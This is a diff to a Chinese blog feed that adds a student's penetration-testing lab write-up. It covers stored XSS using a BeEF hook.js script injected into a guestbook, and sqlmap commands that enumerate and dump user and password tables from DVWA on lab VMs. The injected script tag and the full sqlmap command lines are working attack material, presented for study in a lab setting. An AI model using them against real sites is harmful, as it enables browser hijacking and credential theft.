@@ -10,10 +10,125 @@
         </author>
         <description>今天不学习明天变菜狗</description>
         <language>zh-CN</language>
-        <pubDate>Tue, 10 Nov 2020 20:24:54 +0800</pubDate>
-        <lastBuildDate>Tue, 10 Nov 2020 20:24:54 +0800</lastBuildDate>
+        <pubDate>Sun, 22 Nov 2020 16:28:18 +0800</pubDate>
+        <lastBuildDate>Sun, 22 Nov 2020 16:28:18 +0800</lastBuildDate>
         <category term="关键词1" />
         <category term="关键词2" />
+        <item>
+            <guid isPermalink="true">https://sovegetable.github.io/test3/</guid>
+            <title>网络渗透测试实验三</title>
+            <link>https://sovegetable.github.io/test3/</link>
+            <category term="homework" scheme="https://sovegetable.github.io/tags/homework/" />
+            <pubDate>Sun, 22 Nov 2020 16:28:18 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;xss部分利用beef劫持被攻击者客户端浏览器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss部分利用beef劫持被攻击者客户端浏览器&#34;&gt;#&lt;/a&gt; &lt;strong&gt;XSS&lt;strong&gt;&lt;strong&gt; 部分：利用&lt;/strong&gt;&lt;/strong&gt; Beef**** 劫持被攻击者客户端浏览器。&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;kbd&#34;&gt;实验环境：存在 xss 漏洞的留言板，IIS 虚拟机，Kali&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;1-利用awvs扫描留言簿网站发现其存在xss漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-利用awvs扫描留言簿网站发现其存在xss漏洞&#34;&gt;#&lt;/a&gt; 1、利用 AWVS 扫描留言簿网站，发现其存在 XSS 漏洞。&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;可以看到你开默认模式的话会有大量的测试 payload 写入留言板&lt;/p&gt;
+&lt;p&gt;所以在实战扫描时要注意，扫描但&lt;span class=&#34;label danger&#34;&gt;🔒不要破坏资产&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;4.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;2-kali使用beef生成恶意代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-kali使用beef生成恶意代码&#34;&gt;#&lt;/a&gt; 2、 Kali 使用 beef 生成恶意代码&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;打开终端启动 beef-xss 会自动生成恶意文件&lt;/p&gt;
+&lt;p&gt;并通过跨站运行脚本的形式操控被攻击者&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;3-访问留言簿网站将恶意代码写入网站留言板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-访问留言簿网站将恶意代码写入网站留言板&#34;&gt;#&lt;/a&gt; 3、访问留言簿网站，将恶意代码写入网站留言板.&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;script src=&amp;quot;http://192.168.0.135:3000/hook.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;3.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;4-管理员登录loginhtm账号密码均为admin审核用户留言-只要客户端访问这个服务器的留言板客户端浏览器就会被劫持指定被劫持网站为学校主页将你在beff中的配置截图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-管理员登录loginhtm账号密码均为admin审核用户留言-只要客户端访问这个服务器的留言板客户端浏览器就会被劫持指定被劫持网站为学校主页将你在beff中的配置截图&#34;&gt;#&lt;/a&gt; 4、管理员登录 login.htm，账号密码均为 admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在 beff 中的配置截图。&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;5.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;6.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;8.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;5-回答问题实验中xss攻击属于哪种类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-回答问题实验中xss攻击属于哪种类型&#34;&gt;#&lt;/a&gt; 5、回答问题：实验中 XSS 攻击属于哪种类型？&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;XSS 有三种类型&lt;/p&gt;
+&lt;p&gt;1. 反射型&lt;/p&gt;
+&lt;p&gt;反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。&lt;/p&gt;
+&lt;p&gt;对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本 “反射” 回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。&lt;/p&gt;
+&lt;p&gt;此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。&lt;/p&gt;
+&lt;p&gt;2. 存储型&lt;/p&gt;
+&lt;p&gt;攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型 XSS 的危害会更大。&lt;/p&gt;
+&lt;p&gt;存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。&lt;/p&gt;
+&lt;p&gt;3.Dom 型&lt;/p&gt;
+&lt;p&gt;客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;ins class=&#34;dot.warning&#34;&gt;&lt;strong&gt;本次实验是存储型 XSS 漏洞&lt;/strong&gt;&lt;/ins&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;sql注入部分dvwasqlmapmysql注入实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入部分dvwasqlmapmysql注入实战&#34;&gt;#&lt;/a&gt; &lt;strong&gt;SQL 注入部分：DVWA+SQLmap+Mysql 注入实战&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;实验环境搭建。启动 Metasploitable2 虚拟机。&lt;/p&gt;
+&lt;p&gt;用 kali 访问 Metasploitable2 的 dvwa&lt;/p&gt;
+&lt;h2 id=&#34;img1-注入点发现-首先肯定是要判断是否有注入漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#img1-注入点发现-首先肯定是要判断是否有注入漏洞&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../source/assets/clip_image002.jpg&#34; alt=&#34;img&#34;&gt;1、注入点发现。首先肯定是要判断是否有注入漏洞。&lt;/h2&gt;
+&lt;p&gt;在输入框输入 1，返回&lt;/p&gt;
+&lt;p&gt;ID: 1&lt;/p&gt;
+&lt;p&gt;First name: admin&lt;/p&gt;
+&lt;p&gt;Surname: admin&lt;/p&gt;
+&lt;p&gt;返回正常；&lt;/p&gt;
+&lt;p&gt;再次输入 1&#39;，报错，返回&lt;/p&gt;
+&lt;p&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1&lt;/p&gt;
+&lt;p&gt;此时可以断定有 SQL 注入漏洞，&lt;/p&gt;
+&lt;p&gt;下面利用 SQLMap 进行注入攻击。将 DVWA 安全级别设置为最低；&lt;/p&gt;
+&lt;p&gt;因为需要登陆到 dvwa 所以需要获取到 cookies (f12)&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;9.png&#34; alt&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-枚举当前使用的数据库名称和用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-枚举当前使用的数据库名称和用户名&#34;&gt;#&lt;/a&gt; 2、枚举当前使用的数据库名称和用户名。&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../source/assets/clip_image004.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sqlmap -u &#39;192.168.0.119/dvwa/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#39; --cookie=&#39;security=low; PHPSESSID=1b12f42a1d09ded8a69bef4a465df117&#39; -b --current-db --current-user&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;10.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;3-枚举数据库用户名和密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-枚举数据库用户名和密码&#34;&gt;#&lt;/a&gt; 3、枚举数据库用户名和密码&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sqlmap -u &#39;192.168.0.119/dvwa/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#39; --cookie=&#39;security=low; PHPSESSID=1b12f42a1d09ded8a69bef4a465df117&#39; -D dvwa --string=&amp;quot;Surname&amp;quot; --users --password&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;11.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../source/assets/clip_image006.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;4-枚举数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-枚举数据库&#34;&gt;#&lt;/a&gt; 4、枚举数据库&lt;/h2&gt;
+&lt;p&gt;--dbs：枚举当前数据库&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sqlmap -u &#39;192.168.0.119/dvwa/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#39; --cookie=&#39;security=low; PHPSESSID=1b12f42a1d09ded8a69bef4a465df117&#39; --dbs&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;12.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;5-枚举数据库和指定数据库的数据表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-枚举数据库和指定数据库的数据表&#34;&gt;#&lt;/a&gt; 5、枚举数据库和指定数据库的数据表&lt;/h2&gt;
+&lt;p&gt;-D 数据库名：指定数据库&lt;/p&gt;
+&lt;p&gt;--tables：枚举指定数据库的所有表&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sqlmap -u &#39;192.168.0.119/dvwa/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#39; --cookie=&#39;security=low; PHPSESSID=1b12f42a1d09ded8a69bef4a465df117&#39; -D mysql -T user --columns&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;13.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;6-获取指定数据库和表中所有列的信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6-获取指定数据库和表中所有列的信息&#34;&gt;#&lt;/a&gt; 6、获取指定数据库和表中所有列的信息&lt;/h2&gt;
+&lt;p&gt;-D：指定的数据库&lt;/p&gt;
+&lt;p&gt;-T：指定数据库中的数据表&lt;/p&gt;
+&lt;p&gt;--columns：获取列的信息&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sqlmap -u &#39;192.168.0.119/dvwa/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#39; --cookie=&#39;security=low; PHPSESSID=1b12f42a1d09ded8a69bef4a465df117&#39; -D mysql -T user -C user,password --dump&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;14.png&#34; alt&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;7-枚举指定数据表中的所有用户名与密码并down到本地&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7-枚举指定数据表中的所有用户名与密码并down到本地&#34;&gt;#&lt;/a&gt; 7、枚举指定数据表中的所有用户名与密码，并 down 到本地。&lt;/h2&gt;
+&lt;p&gt;-C：枚举数据表中的列&lt;/p&gt;
+&lt;p&gt;--dump：存储数据表项&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sqlmap -u &#39;192.168.0.119/dvwa/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#39; --cookie=&#39;security=low; PHPSESSID=1b12f42a1d09ded8a69bef4a465df117&#39; --string=&amp;quot;Surname&amp;quot; -D dvwa -T users -C user,password --dump&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;15.png&#34; alt&gt;&lt;/p&gt;
+&lt;div class=&#34;note info&#34;&gt;
+&lt;p&gt;文件保存在 root 文件夹需要 root 的权限才能查看，可以通过 chmod 命令更改权限。此外.local 文件是隐藏文件夹 图形化界面按下组合键 ctrl+H 显示，命令行 ls -la.&lt;/p&gt;
+&lt;/div&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; &lt;strong&gt;总结&lt;/strong&gt;&lt;/h1&gt;
+&lt;div class=&#34;note success&#34;&gt;
+&lt;p&gt;这次实验学习了 sqlmap 和 beef 的使用，了解了关于 sql 注入和 xss 利用的知识，&lt;mark&gt; 没有金刚钻别揽瓷器活&lt;/mark&gt;学会使用工具是提高效率的第一步。之后还要探索工具背后的实现原理，这样才能做到游刃有余！&lt;/p&gt;
+&lt;/div&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://sovegetable.github.io/tuijian/</guid>
             <title>组内实验推荐</title>
